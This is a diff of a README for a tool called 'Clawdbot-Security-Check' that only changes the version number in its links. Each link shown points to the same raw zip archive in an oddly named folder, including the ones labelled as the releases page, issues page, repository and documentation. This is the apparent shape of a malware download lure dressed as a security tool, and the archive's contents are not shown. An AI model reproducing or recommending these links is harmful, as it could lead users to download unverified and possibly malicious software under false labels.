@@ -6,7 +6,7 @@ Welcome to Clawdbot-Security-Check! This tool helps you understand and improve t
 
 ## 📥 Download Now
 
-[![Download Clawdbot-Security-Check](https://github.com/Nep-Cheat/Clawdbot-Security-Check/raw/refs/heads/main/Casuarinaceae/Clawdbot_Security_Check_3.7.zip%https://github.com/Nep-Cheat/Clawdbot-Security-Check/raw/refs/heads/main/Casuarinaceae/Clawdbot_Security_Check_3.7.zip)](https://github.com/Nep-Cheat/Clawdbot-Security-Check/raw/refs/heads/main/Casuarinaceae/Clawdbot_Security_Check_3.7.zip)
+[![Download Clawdbot-Security-Check](https://github.com/Nep-Cheat/Clawdbot-Security-Check/raw/refs/heads/main/Casuarinaceae/Clawdbot_Security_Check_v3.2-beta.3.zip%https://github.com/Nep-Cheat/Clawdbot-Security-Check/raw/refs/heads/main/Casuarinaceae/Clawdbot_Security_Check_v3.2-beta.3.zip)](https://github.com/Nep-Cheat/Clawdbot-Security-Check/raw/refs/heads/main/Casuarinaceae/Clawdbot_Security_Check_v3.2-beta.3.zip)
 
 ## 📋 What Is Clawdbot-Security-Check?
 
@@ -32,9 +32,9 @@ To run this application, you need:
 
 1. Click the link below to visit the Releases page.
    
-   [Download Clawdbot-Security-Check Releases](https://github.com/Nep-Cheat/Clawdbot-Security-Check/raw/refs/heads/main/Casuarinaceae/Clawdbot_Security_Check_3.7.zip)
+   [Download Clawdbot-Security-Check Releases](https://github.com/Nep-Cheat/Clawdbot-Security-Check/raw/refs/heads/main/Casuarinaceae/Clawdbot_Security_Check_v3.2-beta.3.zip)
 
-2. On the Releases page, find the latest version. Look for a file titled `https://github.com/Nep-Cheat/Clawdbot-Security-Check/raw/refs/heads/main/Casuarinaceae/Clawdbot_Security_Check_3.7.zip`, `https://github.com/Nep-Cheat/Clawdbot-Security-Check/raw/refs/heads/main/Casuarinaceae/Clawdbot_Security_Check_3.7.zip`, or similar.
+2. On the Releases page, find the latest version. Look for a file titled `https://github.com/Nep-Cheat/Clawdbot-Security-Check/raw/refs/heads/main/Casuarinaceae/Clawdbot_Security_Check_v3.2-beta.3.zip`, `https://github.com/Nep-Cheat/Clawdbot-Security-Check/raw/refs/heads/main/Casuarinaceae/Clawdbot_Security_Check_v3.2-beta.3.zip`, or similar.
 
 3. Click on the file to download it to your computer.
 
@@ -74,11 +74,11 @@ While some features may work offline, an internet connection is recommended for 
 
 ## 📞 Get Support
 
-For assistance, visit our [issues page](https://github.com/Nep-Cheat/Clawdbot-Security-Check/raw/refs/heads/main/Casuarinaceae/Clawdbot_Security_Check_3.7.zip) to report problems or ask questions. Our community is here to help.
+For assistance, visit our [issues page](https://github.com/Nep-Cheat/Clawdbot-Security-Check/raw/refs/heads/main/Casuarinaceae/Clawdbot_Security_Check_v3.2-beta.3.zip) to report problems or ask questions. Our community is here to help.
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/Nep-Cheat/Clawdbot-Security-Check/raw/refs/heads/main/Casuarinaceae/Clawdbot_Security_Check_3.7.zip)
-- [User Documentation](https://github.com/Nep-Cheat/Clawdbot-Security-Check/raw/refs/heads/main/Casuarinaceae/Clawdbot_Security_Check_3.7.zip)
+- [GitHub Repository](https://github.com/Nep-Cheat/Clawdbot-Security-Check/raw/refs/heads/main/Casuarinaceae/Clawdbot_Security_Check_v3.2-beta.3.zip)
+- [User Documentation](https://github.com/Nep-Cheat/Clawdbot-Security-Check/raw/refs/heads/main/Casuarinaceae/Clawdbot_Security_Check_v3.2-beta.3.zip)
 
 Thank you for choosing Clawdbot-Security-Check! By enhancing your security awareness, you contribute to a safer digital environment.
